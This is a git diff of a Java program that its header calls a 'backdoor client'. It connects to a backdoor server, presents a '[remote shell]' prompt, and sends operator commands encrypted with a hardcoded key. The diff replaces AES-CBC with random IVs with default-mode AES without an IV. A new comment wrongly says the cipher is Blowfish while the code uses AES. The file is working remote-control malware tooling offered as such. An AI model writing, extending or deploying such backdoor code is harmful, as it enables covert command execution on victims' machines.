@@ -1,25 +1,21 @@
-import org.apache.commons.codec.binary.Base64;
-
 import javax.crypto.Cipher;
-import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 import java.io.BufferedReader;
-import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.Socket;
 import java.security.Key;
-import java.security.SecureRandom;
+import java.util.Base64;
 import java.util.Scanner;
 
 /**
  * This is the backdoor client
- *
+ * Use ip = 127.0.0.1 and port = 9999 by default
  * @author salah3x
  */
 public class Client {
 
-	public static void main(String[] args) throws IOException {
+	public static void main(String[] args) throws Exception {
 
 		//Server ip
 		String host = "127.0.0.1";
@@ -40,9 +36,12 @@ public class Client {
 		//Symmetric encryption is used
 		String encryptionKey = "sixteen byte key";
 
+		//Encryption algo
+		String algorithm = "AES";
+
 		//A helper class used to encrypt and decrypt Strings
-		//Uses the AES algorithm
-		Server.CryptoHelper cryptoHelper = new Server.CryptoHelper(encryptionKey);
+		//Uses the Blowfish algorithm
+		CryptoHelper cryptoHelper = new CryptoHelper(encryptionKey, algorithm);
 
 		//Starting the server
 		Socket socket = new Socket(host, port);
@@ -58,7 +57,7 @@ public class Client {
 		while (!socket.isClosed()) {
 			try {
 				//Getting user input
-				System.out.print("[remote shell] $ ");
+				System.err.print("[remote shell] $ ");
 				String cmd = scanner.nextLine();
 
 				//Encrypting and sending command
@@ -83,7 +82,6 @@ public class Client {
 				socket.close();
 			}
 		}
-		System.out.println("Disconnected from server");
 	}
 
 	/**
@@ -92,49 +90,29 @@ public class Client {
 	 */
 	static class CryptoHelper {
 
+		private Cipher cipher;
 		private Key key;
 
-		public CryptoHelper(String key) {
-			this.key = new SecretKeySpec(key.getBytes(), "AES");
+		CryptoHelper(String key, String algo) throws Exception {
+			this.key = new SecretKeySpec(key.getBytes(), algo);
+			this.cipher = Cipher.getInstance(algo);
 		}
 
-		static byte[] generateIV() {
-			SecureRandom random = new SecureRandom();
-			byte[] iv = new byte[16];
-			random.nextBytes(iv);
-			return iv;
+		String encrypt(String plaintext) throws Exception {
+			if (plaintext == null)
+				return null;
+			cipher.init(Cipher.ENCRYPT_MODE, key);
+			byte[] encrypted = cipher.doFinal(plaintext.getBytes());
+			return Base64.getEncoder().encodeToString(encrypted);
 		}
 
-		public String encrypt(String plaintext) throws Exception {
-			byte[] iv = generateIV();
-			byte[] decrypted = plaintext.getBytes();
-			byte[] encrypted = encrypt(iv, decrypted);
-			StringBuilder ciphertext = new StringBuilder();
-			ciphertext.append(Base64.encodeBase64String(iv));
-			ciphertext.append(":");
-			ciphertext.append(Base64.encodeBase64String(encrypted));
-			return ciphertext.toString();
-
-		}
-
-		public String decrypt(String ciphertext) throws Exception {
-			String[] parts = ciphertext.split(":");
-			byte[] iv = Base64.decodeBase64(parts[0]);
-			byte[] encrypted = Base64.decodeBase64(parts[1]);
-			byte[] decrypted = decrypt(iv, encrypted);
+		String decrypt(String encrypted) throws Exception {
+			if (encrypted == null)
+				return null;
+			cipher.init(Cipher.DECRYPT_MODE, key);
+			byte[] decorded = Base64.getDecoder().decode(encrypted);
+			byte[] decrypted = cipher.doFinal(decorded);
 			return new String(decrypted);
-		}
-
-		byte[] encrypt(byte[] iv, byte[] plaintext) throws Exception {
-			Cipher cipher = Cipher.getInstance(key.getAlgorithm() + "/CBC/PKCS5Padding");
-			cipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(iv));
-			return cipher.doFinal(plaintext);
-		}
-
-		byte[] decrypt(byte[] iv, byte[] ciphertext) throws Exception {
-			Cipher cipher = Cipher.getInstance(key.getAlgorithm() + "/CBC/PKCS5Padding");
-			cipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(iv));
-			return cipher.doFinal(ciphertext);
 		}
 	}
 }
